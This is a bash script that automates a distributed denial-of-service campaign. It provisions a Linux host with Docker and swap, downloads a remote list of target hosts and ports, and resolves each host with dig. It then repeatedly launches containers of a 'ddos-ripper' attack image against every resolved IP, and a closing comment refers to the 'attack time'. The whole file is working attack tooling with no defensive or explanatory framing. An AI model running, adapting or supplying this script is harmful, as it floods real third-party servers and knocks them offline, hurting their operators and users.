. /tmp/variables.sh
echo "in loop NEW_LINKS is $NEW_LINKS"
[[ -f $NEW_LINKS ]] && rm $NEW_LINKS
[[ -f $TMP_LINKS ]] && rm $TMP_LINKS

convert_links_file() {
    if file $TMP_LINKS | grep CRLF; then
        echo "$TMP_LINKS contains CRLF. Converting file"
        sudo sed -i 's/\r$//' $TMP_LINKS
        sudo mv $TMP_LINKS $LINKS_FILE
    fi
}



download_links() {
    $LOCAL_LINKS && return 1
    sudo wget -N $WGET_LINK -P /tmp/links_new/ &>/tmp/response
    if cat /tmp/response | grep -q 'not retrieving'; then
        echo "no new file downloaded"
        return 1
    elif cat /tmp/response | grep -q 'Saving to'; then
        echo "new file downloaded. Prepearing and Converting"
        [[ -f $TMP_LINKS ]] && rm $TMP_LINKS
        sudo cp $NEW_LINKS $TMP_LINKS
        convert_links_file
        sudo docker rm -f $(docker ps -q -a) #removing all working containers in case of links.txt refresh and restart loop
        export LINKS_UPDATED=true
        return 0
    else
        echo "Something wrong happened with file downloading. Response is:"
        cat /tmp/response
        exit 1
    fi
}

status_check() {
    if [[ $LINKS_UPDATED == true ]]; then
        export LINKS_UPDATED=false
        echo "status check is positive"
        return 0
    else
        echo "status check of new links downloaded is negative"
        return 1
    fi
}

if [ -s $LINKS_FILE ]; then
    echo "local links provided" && cat $LINKS_FILE
    convert_links_file
    LOCAL_LINKS=true
else
    echo "There is no local links.txt. Downloading"
    download_links
fi

echo "loop script started"
# host init
sudo yum -y update
sudo yum search docker
sudo yum -y install docker
sudo systemctl start docker.service
sleep 5
# host init
echo "docker installed"
sudo docker version
echo "docker versioned"
# swop improvement
sudo fallocate -l 8G /swapfile
sudo dd if=/dev/zero of=/swapfile bs=1024 count=8388608
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
# swop improvement
echo "swapfile created"

IMAGE="dieputindie/ddos-ripper:latest"
sudo docker pull $IMAGE

circle=0

while true; do
    ((circle++))
    echo "Current circle is $circle"
    while read link; do
        while [ $(sudo docker ps | wc -l) -gt 3 ]; do
            sleep 30
            status_check && break
        done
        echo "current link is $link"
        HOST=$(echo $link | awk -F ' ' '{print $1}')
        echo "digging " && sudo dig +short $HOST
        if [[ $HOST =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo $HOST >/tmp/ips.txt
        else
            sudo dig +short $HOST >/tmp/ips.txt
        fi

        cat /tmp/ips.txt
        while read ip; do
            if [[ $ip =~ $PATTERN ]]; then
                echo "Found localhost ip: $ip. Skipping"
                continue
            fi 
            while [ $(sudo docker ps | wc -l) -gt 3 ]; do
                sleep 30
            done
            echo "Current target is $ip"
            THIS_HOSTNAME=$(echo $ip | awk -F ' ' '{print $1}')
            THIS_PORT=$(echo $link | awk -F ' ' '{print $2}')
            sudo docker stop -t $1 $(sudo docker run --rm -e THIS_HOSTNAME=$THIS_HOSTNAME -e THIS_PORT=$THIS_PORT -e ENABLE_LOG=$ENABLE_LOG -d --stop-signal 2 $IMAGE) &
            sleep 5
        done </tmp/ips.txt

    done <$LINKS_FILE
done
sleep $1 # waiting attack time after last links started, before server shutdown
sudo shutdown now
